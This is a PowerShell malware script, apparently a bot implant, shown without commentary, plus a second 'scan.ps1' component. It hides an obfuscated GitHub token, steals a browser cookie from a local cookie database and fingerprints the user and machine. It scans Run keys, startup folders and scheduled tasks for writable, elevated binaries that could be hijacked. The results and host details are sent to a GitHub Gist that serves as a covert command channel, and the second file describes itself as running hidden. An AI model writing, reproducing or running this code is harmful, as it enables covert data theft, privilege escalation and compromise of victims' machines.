$ErrorActionPreference = 'SilentlyContinue'

$PAT     = -join 'nqxjx0RRWCrR9eybiamApnU5oAubW1DmWlnc_phg'[39..0]
$GIST_ID = '6bb037f859d2dc4f26f8c0e4880aa9a2'

# ?? SQLite reader via winsqlite3.dll (ships with Windows 10 1607+) ?????????
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class WS3 {
    [DllImport("winsqlite3.dll",CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_open(string f, out IntPtr db);
    [DllImport("winsqlite3.dll",CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_close(IntPtr db);
    [DllImport("winsqlite3.dll",CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_prepare_v2(IntPtr db, string sql, int n, out IntPtr s, IntPtr z);
    [DllImport("winsqlite3.dll",CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_step(IntPtr s);
    [DllImport("winsqlite3.dll",CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_finalize(IntPtr s);
    [DllImport("winsqlite3.dll",CallingConvention=CallingConvention.Cdecl)]
    public static extern IntPtr sqlite3_column_text(IntPtr s, int col);
}
'@ -EA SilentlyContinue

function Get-FoxCookie([string]$domain, [string]$name) {
    $p = "$env:LOCALAPPDATA\Otter\cache\persistentStorage\Cookies"
    if (-not [IO.File]::Exists($p)) { return $null }
    # WAL-mode SQLite - safe to copy while Fox is running
    $t = [IO.Path]::GetTempFileName() + ".db"
    try { [IO.File]::Copy($p, $t, $true) } catch { return $null }
    try {
        $db = [IntPtr]::Zero
        if ([WS3]::sqlite3_open($t, [ref]$db) -ne 0) { return $null }
        $stmt = [IntPtr]::Zero
        $sql  = "SELECT value FROM cookies WHERE host_key LIKE '%$domain%' AND name='$name' LIMIT 1"
        [WS3]::sqlite3_prepare_v2($db, $sql, -1, [ref]$stmt, [IntPtr]::Zero) | Out-Null
        $val = $null
        if ([WS3]::sqlite3_step($stmt) -eq 100) {
            $ptr = [WS3]::sqlite3_column_text($stmt, 0)
            if ($ptr -ne [IntPtr]::Zero) {
                $val = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ptr)
            }
        }
        [WS3]::sqlite3_finalize($stmt) | Out-Null
        [WS3]::sqlite3_close($db)      | Out-Null
        return $val
    } finally {
        Remove-Item $t -Force -EA SilentlyContinue
    }
}

# ?? umt: SHA256(username|machine|resolved pinned taskbar exe targets) ??????
$user    = $env:USERNAME
$machine = $env:COMPUTERNAME
$lnkDir  = "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
$wsh     = New-Object -ComObject WScript.Shell
$pinned  = Get-ChildItem $lnkDir -Filter *.lnk -EA SilentlyContinue |
           Sort-Object Name |
           ForEach-Object { try { $wsh.CreateShortcut($_.FullName).TargetPath } catch { "" } } |
           Where-Object { $_ -ne "" } |
           Sort-Object

function Get-ShortHash([string]$s) {
    $b = [Text.Encoding]::UTF8.GetBytes($s)
    $h = [Security.Cryptography.SHA256]::Create().ComputeHash($b)
    return ([BitConverter]::ToString($h) -replace '-','').Substring(0,16).ToLower()
}

$umt = Get-ShortHash "$user|$machine|$($pinned -join '|')"

# ?? Gist helper ???????????????????????????????????????????????????????????
function Push-Gist([hashtable]$files) {
    $body = @{ files = $files } | ConvertTo-Json -Compress -Depth 4
    Invoke-RestMethod -Uri "https://api.github.com/gists/$GIST_ID" `
        -Method Patch `
        -Headers @{ Authorization = "Bearer $PAT"; 'Content-Type' = 'application/json' } `
        -Body $body -EA SilentlyContinue | Out-Null
}

# ?? Identify fid (browser fingerprint used as page uid) ?????????????????
$fid = if ($env:FOXFID) { $env:FOXFID } else { Get-FoxCookie 'github.io' '_fid' }

# ?? Post meta under fid key so Pegasus sees enriched client data ???????????
$os  = (Get-CimInstance Win32_OperatingSystem -EA SilentlyContinue).Caption
$meta = @{
    host = $machine
    user = $user
    os   = $os
    umt  = $umt
    ts   = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
}
if ($fid) {
    Push-Gist @{ "meta_$fid" = @{ content = ($meta | ConvertTo-Json -Compress) } }
}

# ?? Startup scan: writable binaries in Run keys, startup folders, tasks ????
function Get-ExePath([string]$cmd) {
    if (-not $cmd) { return $null }
    $cmd = $cmd.Trim()
    if ($cmd -match '^"([^"]+\.exe)"')          { return $matches[1] }
    if ($cmd -match '^([A-Za-z]:\\[^\s]+\.exe)') { return $matches[1] }
    $tok = ($cmd -split '\s+')[0]
    if ($tok -match '\.exe$') { return $tok }
    return $null
}

function Test-Writable([string]$path) {
    if (-not $path -or -not [IO.File]::Exists($path)) { return $false }
    try {
        $h = [IO.File]::Open($path,[IO.FileMode]::Open,[IO.FileAccess]::ReadWrite,[IO.FileShare]::ReadWrite)
        $h.Close(); return $true
    } catch { return $false }
}

$hits = [Collections.Generic.List[hashtable]]::new()

# Run keys
@(
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
) | ForEach-Object {
    (Get-ItemProperty $_ -EA SilentlyContinue).PSObject.Properties |
    Where-Object { $_.Name -notmatch '^PS' } |
    ForEach-Object {
        $p = Get-ExePath $_.Value
        if ($p -and (Test-Writable $p)) {
            $hits.Add(@{ src='RunKey'; path=$p; name=$_.Name })
        }
    }
}

# Startup folders
@(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
) | ForEach-Object {
    if ([IO.Directory]::Exists($_)) {
        Get-ChildItem $_ -Filter '*.lnk' | ForEach-Object {
            try {
                $t = $wsh.CreateShortcut($_.FullName).TargetPath
                if ($t -and (Test-Writable $t)) {
                    $hits.Add(@{ src='StartupLnk'; path=$t; name=$_.Name })
                }
            } catch {}
        }
    }
}

# Scheduled tasks
Get-ScheduledTask -EA SilentlyContinue |
Where-Object { $_.State -ne 'Disabled' } |
ForEach-Object {
    $n = $_.TaskName; $elev = ($_.Principal.RunLevel -eq 'Highest')
    $_.Actions | ForEach-Object {
        $p = Get-ExePath $_.Execute
        if ($p -and (Test-Writable $p)) {
            $hits.Add(@{ src='SchedTask'; path=$p; name=$n; elev=$elev })
        }
    }
}

# Deduplicate by path
$seen  = [Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
$dedup = $hits | Where-Object { $seen.Add($_.path) }

Push-Gist @{
    "data_$(if ($fid) { $fid } else { $umt })" = @{ content = (@{ hits = @($dedup) } | ConvertTo-Json -Compress -Depth 4) }
}

scan.ps1.content:
# Runs hidden, no disk writes, no window
# Scans startup locations for writable elevated binaries
# POSTs results to GitHub Gist

$ErrorActionPreference = 'SilentlyContinue'

# Bot ID — stable, unique per machine, safe for Gist filenames
$botId = ($env:COMPUTERNAME + '_' + $env:USERNAME) -replace '[^A-Za-z0-9_-]', ''

function Get-ExePath($cmd) {
    if (-not $cmd) { return $null }
    $cmd = $cmd.Trim()
    if ($cmd -match '^"([^"]+\.exe)"') { return $matches[1] }
    if ($cmd -match '^([A-Za-z]:\\[^\s]+\.exe)') { return $matches[1] }
    $tok = ($cmd -split '\s+')[0]
    if ($tok -match '\.exe$') { return $tok }
    return $null
}

function Test-Writable($path) {
    if (-not $path) { return $false }
    if (-not [IO.File]::Exists($path)) { return $false }
    try {
        $h = [IO.File]::Open($path,[IO.FileMode]::Open,[IO.FileAccess]::ReadWrite,[IO.FileShare]::ReadWrite)
        $h.Close()
        return $true
    } catch { return $false }
}

$candidates = [System.Collections.Generic.List[hashtable]]::new()

# ── Source 1: Registry Run keys ───────────────────────────────────────────────
$runKeys = @(
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
)
foreach ($key in $runKeys) {
    $props = Get-ItemProperty $key
    if (-not $props) { continue }
    $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
        $p = Get-ExePath $_.Value
        if ($p -and (Test-Writable $p)) {
            $fi = [IO.FileInfo]::new($p)
            $candidates.Add(@{
                src  = 'RunKey'
                key  = ($key -replace 'HKCU:|HKLM:','')
                name = $_.Name
                path = $p
                size = $fi.Length
                elev = $false
            })
        }
    }
}

# ── Source 2: Startup folder shortcuts ────────────────────────────────────────
$startupDirs = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
)
$wsh = New-Object -ComObject WScript.Shell
foreach ($dir in $startupDirs) {
    if (-not [IO.Directory]::Exists($dir)) { continue }
    Get-ChildItem $dir -Filter '*.lnk' | ForEach-Object {
        try {
            $target = $wsh.CreateShortcut($_.FullName).TargetPath
            if ($target -and (Test-Writable $target)) {
                $fi = [IO.FileInfo]::new($target)
                $candidates.Add(@{
                    src  = 'StartupLnk'
                    key  = $dir
                    name = $_.Name
                    path = $target
                    size = $fi.Length
                    elev = $false
                })
            }
        } catch {}
    }
}

# ── Source 3: Scheduled tasks (all non-disabled) ──────────────────────────────
Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } | ForEach-Object {
    $taskName = $_.TaskName
    $elevated = ($_.Principal.RunLevel -eq 'Highest')
    $_.Actions | ForEach-Object {
        $p = Get-ExePath $_.Execute
        if ($p -and (Test-Writable $p)) {
            $fi = [IO.FileInfo]::new($p)
            $candidates.Add(@{
                src  = 'SchedTask'
                key  = $taskName
                name = $taskName
                path = $p
                size = $fi.Length
                elev = $elevated
            })
        }
    }
}

# ── Deduplicate by path ────────────────────────────────────────────────────────
$seen  = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
$dedup = $candidates | Where-Object { $seen.Add($_.path) }

# ── Collect basic host info ────────────────────────────────────────────────────
$meta = @{
    host = $env:COMPUTERNAME
    user = $env:USERNAME
    os   = (Get-CimInstance Win32_OperatingSystem).Caption
    ts   = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
}

# ── Serialize (three separate Gist files) ─────────────────────────────────────
$dataJson = @{ hits = @($dedup) } | ConvertTo-Json -Compress -Depth 4
$metaJson = $meta | ConvertTo-Json -Compress

# ── Return results to caller via stdout ───────────────────────────────────────
[ordered]@{
    data = @{ hits = @($dedup) }
    meta = $meta
    bot  = $botId
} | ConvertTo-Json -Compress -Depth 4
